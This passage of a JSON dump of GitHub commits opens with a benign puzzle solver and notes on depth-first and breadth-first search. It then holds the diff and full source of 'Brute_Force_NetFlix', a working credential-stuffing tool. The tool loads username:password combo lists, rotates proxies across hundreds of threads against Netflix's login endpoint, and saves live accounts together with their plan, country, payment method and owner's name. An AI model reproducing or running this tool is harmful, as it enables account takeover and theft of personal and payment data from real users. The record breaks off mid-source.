'phrase_bf.txt'))\n"}},"msg":"fast brute force and eval updates"}},"https:\/\/github.com\/RissRossApplesauce\/DKC3":{"0ea4ee0eebdbc9cbf5a876c96b01f1560a4912c1":{"url":"https:\/\/api.github.com\/repos\/RissRossApplesauce\/DKC3\/commits\/0ea4ee0eebdbc9cbf5a876c96b01f1560a4912c1","html_url":"https:\/\/github.com\/RissRossApplesauce\/DKC3\/commit\/0ea4ee0eebdbc9cbf5a876c96b01f1560a4912c1","message":"Fixed a small problem in 2017\/Color.py and updated brute-force notes","sha":"0ea4ee0eebdbc9cbf5a876c96b01f1560a4912c1","keyword":"brute force update","diff":"diff --git a\/2017\/Color.py b\/2017\/Color.py\nindex 061f559..9e3de7a 100644\n--- a\/2017\/Color.py\n+++ b\/2017\/Color.py\n@@ -11,7 +11,7 @@ def solve(x, n):\n     grid = x.split('\\n')\n     grid = [*map(lambda s: s.split(' '), grid)]\n \n-    def solved(grid):\n+    def accept(grid):\n         color = None\n         for row in grid:\n             for entry in row:\n@@ -21,7 +21,7 @@ def solved(grid):\n                     return False\n         return True\n \n-    def movesfrom(grid):\n+    def options(grid):\n         results = []\n         direction = [\n             (0, 1),\n@@ -39,7 +39,7 @@ def movesfrom(grid):\n                     if 0 <= newi < len(grid) and 0 <= newj < len(grid):\n                         color2 = grid[newi][newj]\n                         if color == color2:\n-                            break\n+                            continue\n                         newgrid = copy.deepcopy(grid)\n                         for othercolor in colors:\n                             if othercolor != color and othercolor != color2:\n@@ -51,14 +51,14 @@ def movesfrom(grid):\n     \n     def bfs(grid):\n         explored = list()\n-        q = list()\n+        q = co.deque()\n         explored.append(grid)\n         q.append((grid, 0))\n         while q:\n-            current_grid, moves = q.pop(0)\n-            if solved(current_grid):\n+            current_grid, moves = q.popleft()\n+            if accept(current_grid):\n                 return moves\n-            for new_grid in movesfrom(current_grid):\n+            for new_grid in options(current_grid):\n                 if new_grid not in explored:\n                     explored.append(new_grid)\n                     q.append((new_grid, moves + 1))\n@@ -73,10 +73,12 @@ def mbf(grid):\n         allyall = c.most_common()\n         return allyall[-1][1]\n \n-\n-        \n-\n-    return mbf(grid)\n+    if len(grid) > 5:\n+        # best guess that will hopefully get some points\n+        return mbf(grid)\n+    else:\n+        # brute force that only works on very small inputs\n+        return bfs(grid)\n \n for num, case in enumerate(splitcases(open(fin).read())):\n     print(f'Case {num + 1}:')\ndiff --git a\/Notes\/General Solutions\/brute-force.py b\/Notes\/General Solutions\/brute-force.py\nindex 58430da..e4a139b 100644\n--- a\/Notes\/General Solutions\/brute-force.py\t\n+++ b\/Notes\/General Solutions\/brute-force.py\t\n@@ -1,5 +1,6 @@\n \"\"\"\n-General brute-force algorithm.\n+General brute-force algorithms.\n+You can optionally define a reject() method that allows for the backtracking optimization.\n \"\"\"\n \n def solve(x):\n@@ -14,23 +15,68 @@ def options(c):\n         o = []\n         return o\n     \n+    # rather than returning a list, some situations can work with a generator\n+    # use a generator to prevent creating more values than needed\n+    # it is also possible to use a generator to avoid making copies (see 2017 sudoku)\n+    # be careful using this option with breadth-first searches. understand the difference between copy and deep copy\n+    def genoptions(c):\n+        o = c\n+        yield o\n+    \n     # test if the combination should be rejected\n     # optional. not all problems work out so you can reject combinations early\n     def reject(c):\n         pass\n-\n-    def backtrack(c):\n-        if reject(c):\n-            return\n+    \n+    # depth first search\n+    def dfs(c):\n+        # optional for backtracking\n+        # if reject(c):\n+        #     return\n         if accept(c):\n             # found a valid combination\n             nonlocal results\n             results.append(c)\n             return\n         for o in options(c):\n-            backtrack(o)\n+            dfs(o)\n+            \n+        # if you want to stop as soon as a result is found:\n+        # \n+        # if accept(c):\n+        #     nonlocal results\n+        #     results.append(c)\n+        #     return True\n+        # for o in options(c):\n+        #     if dfs(o):\n+        #         return True\n+    \n+    # breadth first search\n+    def bfs(c):\n+        # track explored combinations in a list\n+        e = []\n+        e.append(c)\n+        \n+        # queue to hold new combinations to test\n+        import collections as co\n+        q = co.deque()\n+        q.append(c)\n+        \n+        # main loop. runs until everything has been explored, or a result is accepted\n+        while q:\n+            cur_c = q.pop(0)\n+            if accept(cur_c):\n+                nonlocal results\n+                results.append(cur_c)\n+                # you can simply return here if you only want one solution.\n+                # you don't need to do extra work like in dfs\n+            for new_c in options(cur_c):\n+                if new_c not in e:\n+                    e.append(new_c)\n+                    q.append(new_c)\n     \n     # the initial input should be an empty list\n-    backtrack([])\n+    dfs([])\n+    bfs([])\n \n     return results\n\\ No newline at end of file\n","files":{"\/2017\/Color.py":{"changes":[{"diff":"\n     grid = x.split('\\n')\n     grid = [*map(lambda s: s.split(' '), grid)]\n \n-    def solved(grid):\n+    def accept(grid):\n         color = None\n         for row in grid:\n             for entry in row:\n","add":1,"remove":1,"filename":"\/2017\/Color.py","badparts":["    def solved(grid):"],"goodparts":["    def accept(grid):"]},{"diff":"\n                     return False\n         return True\n \n-    def movesfrom(grid):\n+    def options(grid):\n         results = []\n         direction = [\n             (0, 1),\n","add":1,"remove":1,"filename":"\/2017\/Color.py","badparts":["    def movesfrom(grid):"],"goodparts":["    def options(grid):"]},{"diff":"\n                     if 0 <= newi < len(grid) and 0 <= newj < len(grid):\n                         color2 = grid[newi][newj]\n                         if color == color2:\n-                            break\n+                            continue\n                         newgrid = copy.deepcopy(grid)\n                         for othercolor in colors:\n                             if othercolor != color and othercolor != color2:\n","add":1,"remove":1,"filename":"\/2017\/Color.py","badparts":["                            break"],"goodparts":["                            continue"]},{"diff":"\n     \n     def bfs(grid):\n         explored = list()\n-        q = list()\n+        q = co.deque()\n         explored.append(grid)\n         q.append((grid, 0))\n         while q:\n-            current_grid, moves = q.pop(0)\n-            if solved(current_grid):\n+            current_grid, moves = q.popleft()\n+            if accept(current_grid):\n                 return moves\n-            for new_grid in movesfrom(current_grid):\n+            for new_grid in options(current_grid):\n                 if new_grid not in explored:\n                     explored.append(new_grid)\n                     q.append((new_grid, moves + 1))\n","add":4,"remove":4,"filename":"\/2017\/Color.py","badparts":["        q = list()","            current_grid, moves = q.pop(0)","            if solved(current_grid):","            for new_grid in movesfrom(current_grid):"],"goodparts":["        q = co.deque()","            current_grid, moves = q.popleft()","            if accept(current_grid):","            for new_grid in options(current_grid):"]},{"diff":"\n         allyall = c.most_common()\n         return allyall[-1][1]\n \n-\n-        \n-\n-    return mbf(grid)\n+    if len(grid) > 5:\n+        # best guess that will hopefully get some points\n+        return mbf(grid)\n+    else:\n+        # brute force that only works on very small inputs\n+        return bfs(grid)\n \n for num, case in enumerate(splitcases(open(fin).read())):\n     print(f'Case {num + 1}:')","add":6,"remove":4,"filename":"\/2017\/Color.py","badparts":["    return mbf(grid)"],"goodparts":["    if len(grid) > 5:","        return mbf(grid)","    else:","        return bfs(grid)"]}],"source":"\nimport functools as ft, itertools as it, operator as op, collections as co, cmath, math, re, traceback, copy, string fin='.\/Short Programming\\ColorIn.txt' fout='.\/Short Programming\\ColorOut.txt' open(fout, 'w').close() def splitcases(x): return x.strip('\\n\\n').split('\\n\\n') def solve(x, n): grid=x.split('\\n') grid=[*map(lambda s: s.split(' '), grid)] def solved(grid): color=None for row in grid: for entry in row: if color is None: color=entry elif entry !=color: return False return True def movesfrom(grid): results=[] direction=[ (0, 1), (1, 0), ] colors=['Red', 'White', 'Blue'] for i in range(len(grid)): for j in range(len(grid)): color=grid[i][j] for d in direction: di, dj=d newi=i +di newj=j +dj if 0 <=newi < len(grid) and 0 <=newj < len(grid): color2=grid[newi][newj] if color==color2: break newgrid=copy.deepcopy(grid) for othercolor in colors: if othercolor !=color and othercolor !=color2: break newgrid[i][j]=othercolor newgrid[newi][newj]=othercolor results.append(newgrid) return results def bfs(grid): explored=list() q=list() explored.append(grid) q.append((grid, 0)) while q: current_grid, moves=q.pop(0) if solved(current_grid): return moves for new_grid in movesfrom(current_grid): if new_grid not in explored: explored.append(new_grid) q.append((new_grid, moves +1)) def mbf(grid): if len(grid)==1: return 0 c=co.Counter() for row in grid: for entry in row: c[entry] +=1 allyall=c.most_common() return allyall[-1][1] return mbf(grid) for num, case in enumerate(splitcases(open(fin).read())): print(f'Case{num +1}:') try: sol=str(solve(case, num)) print(sol, '\\n') except Exception: print(f'Input: \"{case[:99]}\"') print(traceback.format_exc()) sol='' open(fout, 'a').write(sol +'\\n') ","sourceWithComments":"import functools as ft, itertools as it, operator as op, collections as co, cmath, math, re, traceback, copy, string\n\nfin = '.\/Short Programming\\ColorIn.txt'\nfout = '.\/Short Programming\\ColorOut.txt'\nopen(fout, 'w').close()\n\ndef splitcases(x):\n    return x.strip('\\n\\n').split('\\n\\n')\n    \ndef solve(x, n):\n    grid = x.split('\\n')\n    grid = [*map(lambda s: s.split(' '), grid)]\n\n    def solved(grid):\n        color = None\n        for row in grid:\n            for entry in row:\n                if color is None:\n                    color = entry\n                elif entry != color:\n                    return False\n        return True\n\n    def movesfrom(grid):\n        results = []\n        direction = [\n            (0, 1),\n            (1, 0),\n        ]\n\n        colors = ['Red', 'White', 'Blue']\n        for i in range(len(grid)):\n            for j in range(len(grid)):\n                color = grid[i][j]\n                for d in direction:\n                    di, dj = d\n                    newi = i + di\n                    newj = j + dj\n                    if 0 <= newi < len(grid) and 0 <= newj < len(grid):\n                        color2 = grid[newi][newj]\n                        if color == color2:\n                            break\n                        newgrid = copy.deepcopy(grid)\n                        for othercolor in colors:\n                            if othercolor != color and othercolor != color2:\n                                break\n                        newgrid[i][j] = othercolor\n                        newgrid[newi][newj] = othercolor\n                        results.append(newgrid)\n        return results\n    \n    def bfs(grid):\n        explored = list()\n        q = list()\n        explored.append(grid)\n        q.append((grid, 0))\n        while q:\n            current_grid, moves = q.pop(0)\n            if solved(current_grid):\n                return moves\n            for new_grid in movesfrom(current_grid):\n                if new_grid not in explored:\n                    explored.append(new_grid)\n                    q.append((new_grid, moves + 1))\n\n    def mbf(grid):\n        if len(grid) == 1:\n            return 0\n        c = co.Counter()\n        for row in grid:\n            for entry in row:\n                c[entry] += 1\n        allyall = c.most_common()\n        return allyall[-1][1]\n\n\n        \n\n    return mbf(grid)\n\nfor num, case in enumerate(splitcases(open(fin).read())):\n    print(f'Case {num + 1}:')\n    try:\n        sol = str(solve(case, num))\n        print(sol, '\\n')\n    except Exception:\n        print(f'Input: \"{case[:99]}\"')\n        print(traceback.format_exc())\n        sol = ''\n    open(fout, 'a').write(sol + '\\n')"},"\/Notes\/General Solutions\/brute-force.py":{"changes":[{"diff":"\n \"\"\"\n-General brute-force algorithm.\n+General brute-force algorithms.\n+You can optionally define a reject() method that allows for the backtracking optimization.\n \"\"\"\n \n def solve(x):\n","add":2,"remove":1,"filename":"\/Notes\/General Solutions\/brute-force.py","badparts":["General brute-force algorithm."],"goodparts":["General brute-force algorithms.","You can optionally define a reject() method that allows for the backtracking optimization."]},{"diff":"\n         o = []\n         return o\n     \n+    # rather than returning a list, some situations can work with a generator\n+    # use a generator to prevent creating more values than needed\n+    # it is also possible to use a generator to avoid making copies (see 2017 sudoku)\n+    # be careful using this option with breadth-first searches. understand the difference between copy and deep copy\n+    def genoptions(c):\n+        o = c\n+        yield o\n+    \n     # test if the combination should be rejected\n     # optional. not all problems work out so you can reject combinations early\n     def reject(c):\n         pass\n-\n-    def backtrack(c):\n-        if reject(c):\n-            return\n+    \n+    # depth first search\n+    def dfs(c):\n+        # optional for backtracking\n+        # if reject(c):\n+        #     return\n         if accept(c):\n             # found a valid combination\n             nonlocal results\n             results.append(c)\n             return\n         for o in options(c):\n-            backtrack(o)\n+            dfs(o)\n+            \n+        # if you want to stop as soon as a result is found:\n+        # \n+        # if accept(c):\n+        #     nonlocal results\n+        #     results.append(c)\n+        #     return True\n+        # for o in options(c):\n+        #     if dfs(o):\n+        #         return True\n+    \n+    # breadth first search\n+    def bfs(c):\n+        # track explored combinations in a list\n+        e = []\n+        e.append(c)\n+        \n+        # queue to hold new combinations to test\n+        import collections as co\n+        q = co.deque()\n+        q.append(c)\n+        \n+        # main loop. runs until everything has been explored, or a result is accepted\n+        while q:\n+            cur_c = q.pop(0)\n+            if accept(cur_c):\n+                nonlocal results\n+                results.append(cur_c)\n+                # you can simply return here if you only want one solution.\n+                # you don't need to do extra work like in dfs\n+            for new_c in options(cur_c):\n+                if new_c not in e:\n+                    e.append(new_c)\n+                    q.append(new_c)\n     \n     # the initial input should be an empty list\n-    backtrack([])\n+    dfs([])\n+    bfs([])\n \n     return results\n\\ No newline at end of file\n","add":51,"remove":6,"filename":"\/Notes\/General Solutions\/brute-force.py","badparts":["    def backtrack(c):","        if reject(c):","            return","            backtrack(o)","    backtrack([])"],"goodparts":["    def genoptions(c):","        o = c","        yield o","    def dfs(c):","            dfs(o)","    def bfs(c):","        e = []","        e.append(c)","        import collections as co","        q = co.deque()","        q.append(c)","        while q:","            cur_c = q.pop(0)","            if accept(cur_c):","                nonlocal results","                results.append(cur_c)","            for new_c in options(cur_c):","                if new_c not in e:","                    e.append(new_c)","                    q.append(new_c)","    dfs([])","    bfs([])"]}],"source":"\n\"\"\" General brute-force algorithm. \"\"\" def solve(x): results=[] def accept(c): pass def options(c): o=[] return o def reject(c): pass def backtrack(c): if reject(c): return if accept(c): nonlocal results results.append(c) return for o in options(c): backtrack(o) backtrack([]) return results ","sourceWithComments":"\"\"\"\nGeneral brute-force algorithm.\n\"\"\"\n\ndef solve(x):\n    results = []\n    \n    # test if the combination is a valid solution\n    def accept(c):\n        pass\n\n    # get a list of every variable that we can append to c\n    def options(c):\n        o = []\n        return o\n    \n    # test if the combination should be rejected\n    # optional. not all problems work out so you can reject combinations early\n    def reject(c):\n        pass\n\n    def backtrack(c):\n        if reject(c):\n            return\n        if accept(c):\n            # found a valid combination\n            nonlocal results\n            results.append(c)\n            return\n        for o in options(c):\n            backtrack(o)\n    \n    # the initial input should be an empty list\n    backtrack([])\n\n    return results"}},"msg":"Fixed a small problem in 2017\/Color.py and updated brute-force notes"}},"https:\/\/github.com\/0xCARAXES\/Brute_Force_NetFlix":{"43ec40914d2ee76cf563552bcabdf81fa42865ce":{"url":"https:\/\/api.github.com\/repos\/0xCARAXES\/Brute_Force_NetFlix\/commits\/43ec40914d2ee76cf563552bcabdf81fa42865ce","html_url":"https:\/\/github.com\/0xCARAXES\/Brute_Force_NetFlix\/commit\/43ec40914d2ee76cf563552bcabdf81fa42865ce","sha":"43ec40914d2ee76cf563552bcabdf81fa42865ce","keyword":"brute force update","diff":"diff --git a\/Brute_Force_NetFlix.py b\/Brute_Force_NetFlix.py\nindex d84f62f..f3fbaf5 100644\n--- a\/Brute_Force_NetFlix.py\n+++ b\/Brute_Force_NetFlix.py\n@@ -78,7 +78,7 @@ def __init__(self):\n     \n \n     def flwssn(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n-    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn},timeout=5).text\n+    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text\n     def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text)\n     def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\")\n \n","message":"","files":{"\/Brute_Force_NetFlix.py":{"changes":[{"diff":"\n     \n \n     def flwssn(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"]\n-    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn},timeout=5).text\n+    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text\n     def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text)\n     def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\")\n \n","add":1,"remove":1,"filename":"\/Brute_Force_NetFlix.py","badparts":["    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn},timeout=5).text"],"goodparts":["    def Getinfo(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15 (KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn()},timeout=5).text"]}],"source":"\nfrom Design import * import requests,threading,os,string,random class Settings: def __init__(self) -> object: self.Req=requests.session() self.uuid=uuid() self.Lock=threading.Lock() self.ComboEntry=-1 self.PRINT=False self.Attempts=0 self.BadInfo=0 self.Expaired=0 self.Done=0 self.Blocked=0 self.Retry=0 self.Combo= LoadFile(\"Combo\",\"combo.txt\") self.proxies=LoadFile(\"Proxies\",\"proxies.txt\") class THRIDING(): def __init__(self, fuc): self.TARGET=fuc self.threads_list=[] def Generate_threads(self, Attack): for i in range(Attack): threads=threading.Thread(target=self.TARGET) threads.setDaemon(True) self.threads_list.append(threads) return self.threads_list def started(self): for threads_Attack in self.threads_list: threads_Attack.start() def joined(self): for thread_join in self.threads_list: thread_join.join() class BRUTE_FORCE: def __init__(self): self.setting=Settings() self.REQ=requests.Session() Print(False,False,\"?\",Design.red,f\" 1-> Proxy -2-> WithOutProxy -(Skip -> Proxy): \",False); try: self.askProxy=int(input()) except: self.askProxy=1 if self.askProxy==1: Print(False,False,\"?\",Design.red,f\" 1-> http\/s -2-> socks4 -3-> socks5 -(Skip -> https): \",False); try: self.ask=int(input()) except: self.ask=1 self.data={} def flwssn(self) -> requests.Response: self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0(Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Pragma\":\"no-cache\",\"Accept\":\"*\/*\"},timeout=5).cookies[\"flwssn\"] def Getinfo(self) -> requests.Response: self.REQ.get(\"https:\/\/www.netflix.com\/YourAccount\",headers={\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9\",\"Accept-Encoding\":\"gzip, deflate, br\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Connection\":\"keep-alive\",\"Host\":\"www.netflix.com\",\"Referer\":\"https:\/\/www.netflix.com\/browse\",\"Sec-Fetch-Dest\":\"document\",\"Sec-Fetch-Mode\":\"navigate\",\"Sec-Fetch-Site\":\"same-origin\",\"Sec-Fetch-User\":\"?1\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla\/5.0(iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit\/605.1.15(KHTML, like Gecko) Version\/13.0.3 Mobile\/15E148 Safari\/604.1\"},cookies={\"flwssn\":self.flwssn},timeout=5).text def save_goodinfo(self,text) -> string:return open(f\"Hits.txt\",\"a\").write(text) def save_Expaired(self,username,password) -> string:return open(f\"Expaired Accounts.txt\",\"a\").write(f\"{username}:{password}\\n\") def Brute_Force(self,combo): try: proxies=random.choice(self.setting.proxies) if self.ask==1: erp={\"http\": f\"{proxies}\", \"https\": f\"{proxies}\"} elif self.ask==2: erp={\"http\":\"socks4:\/\/\"f\"{proxies}\", \"https\":\"socks4:\/\/\"f\"{proxies}\"} elif self.ask==3: erp={\"http\": \"socks5:\/\/\"f\"{proxies}\", \"https\":\"socks5:\/\/\"f\"{proxies}\"} username,password=combo.split(\":\") except: pass if self.askProxy==1: self.Request_login(username,password,combo,erp) else: self.Request_login(username,password,combo,None) def remove_user(self,combo): if combo not in self.setting.Combo: return self.setting.Combo.remove(combo) if len(self.setting.Combo)==0: print(\"\\n\".join(self.self.setting.Combo), file=open(dir_path +\"\/combo.txt\", \"w\")) def Request_login(self,username,password,combo,proxies): self.data['email']=username self.data['password']=password self.data['setCookies']=True try: Response=self.REQ.post(\"https:\/\/cast-uiboot.prod.http1.netflix.com\/account\/auth\",headers={\"User-Agent\":\"Mozilla\/5.0(Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like Gecko\",\"Accept\":\"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8\",\"Referer\":\"https:\/\/www.netflix.com\/Login\"},data=self.data,timeout=6,proxies=proxies) if \"NetflixId\\\":null,\\\"user\\\":{\\\"\" in Response.text or \"Incorrect email address or password\" in Response.text or \"Missing password\" in Response.text or \"NEVER_MEMBER\" in Response.text: self.setting.BadInfo +=1 self.setting.Attempts +=1 self.remove_user(combo) elif \"FORMER_MEMBER\" in Response.text: self.setting.Expaired +=1 self.setting.Attempts +=1 self.remove_user(combo) self.save_Expaired(username,password) elif \"CURRENT_MEMBER\" in Response.text: info=self.Getinfo() plan=info.text.split('data-uia=\"plan-label\"><b>')[1].split('<\/b>')[0] country=info.text.split('\",\"currentCountry\":\"')[1].split('\"')[0] expire=info.text.split('data-uia=\"nextBillingDate-item\">')[1].split('<')[0] payment=info.text.split('\"paymentMethod\":{\"fieldType\":\"String\",\"value\":\"')[1].split('\"')[0] name=info.text.split('\"firstName\":\"')[1].split('\"')[0] self.setting.Done +=1 self.setting.Attempts +=1 self.remove_user(combo) self.save_goodinfo(f\"{username}:{password}:{plan}:{country}:{expire}:{payment}:{name}\\n\") elif \"BLOCKED\" in Response.text: self.setting.Blocked +=1 except: self.setting.ComboEntry -=1 self.setting.Retry +=1 def main(self): while True: try: self.setting.ComboEntry +=1 combo=self.setting.Combo[self.setting.ComboEntry] except: self.setting.ComboEntry=-1 self.Brute_Force(combo) def printer(self): while True: Design.clearConsle() print(Design.reda,Design.Banner,Design.WHITE) print(f\"\"\" {Design.YELLOW}Checking [{self.setting.Attempts}\/{len(self.setting.Combo)}]{Design.WHITE} {Design.GREEN}Good Acc[{self.setting.Done}]{Design.WHITE} {Design.blueq}Expired Acc [{self.setting.Expaired}]{Design.WHITE} {Design.reda}Bad Info [{self.setting.BadInfo}]{Design.WHITE} {Design.reda}Bloked [{self.setting.Blocked}]{Design.WHITE} {Design.reda}Retry [{self.setting.Retry}]{Design.WHITE} \"\"\",end='\\r') time.sleep(0.6) if len(self.setting.Combo)==0: MsgBox(\"Finsh\",\"Sucess Checked All Combo\") os._exit(0) if __name__=='__main__': Design.clearConsle() print(Design.reda,Design.Banner,Design.WHITE) b=BRUTE_FORCE() Print(False,False,\"?\",Design.red,f\"Threads {Design.reda}(Max=1000 -Skip=500): \",False) try: th=int(input()) except: th=500 threading.Thread(target=b.printer).start() t=THRIDING(b.main) t.Generate_threads(th) t.started() t.joined() ","sourceWithComments":"from Design import *\nimport requests,threading,os,string,random\n\n\n\n\n\n\n\n\nclass Settings:\n    def __init__(self) -> object:\n        self.Req = requests.session()\n        self.uuid = uuid()\n        self.Lock = threading.Lock()\n\n        self.ComboEntry = -1\n\n        self.PRINT = False\n\n        self.Attempts = 0\n        self.BadInfo = 0\n        self.Expaired = 0\n        self.Done = 0\n        self.Blocked =0 \n        self.Retry = 0\n         \n\n        self.Combo =  LoadFile(\"Combo\",\"combo.txt\")\n        self.proxies = LoadFile(\"Proxies\",\"proxies.txt\")\n    \n\n\nclass THRIDING():\n    def __init__(self, fuc):\n        self.TARGET = fuc\n        self.threads_list = []\n\n    def Generate_threads(self, Attack):\n        for i in range(Attack):\n            threads = threading.Thread(target=self.TARGET)\n            threads.setDaemon(True)\n            self.threads_list.append(threads)\n        return self.threads_list\n\n    def started(self):\n        for threads_Attack in self.threads_list:\n            threads_Attack.start()\n\n    def joined(self):\n        for thread_join in self.threads_list:\n            thread_join.join()\n   \n\n\n\n\nclass BRUTE_FORCE:\n    def __init__(self):\n        self.setting = Settings()\n        self.REQ = requests.Session()\n        \n\n        Print(False,False,\"?\",Design.red,f\" 1-> Proxy - 2-> WithOutProxy  - (Skip -> Proxy) : \",False); \n        try : \n            self.askProxy = int(input()) \n        except:\n            self.askProxy = 1\n        if self.askProxy == 1:\n            Print(False,False,\"?\",Design.red,f\" 1-> http\/s - 2-> socks4 - 3-> socks5 - (Skip -> https) : \",False); \n            try : \n                self.ask = int(input()) \n            except:\n                self.ask = 1\n        \n\n        self.data = {}\n    \n\n    def flwssn(self) -> requests.Response : self.REQ.get(\"https:\/\/www.netflix.com\/au\/login\",headers={\"User-Agent\":\"Mozilla\/5.0 (Windows NT 10.0; WOW64; 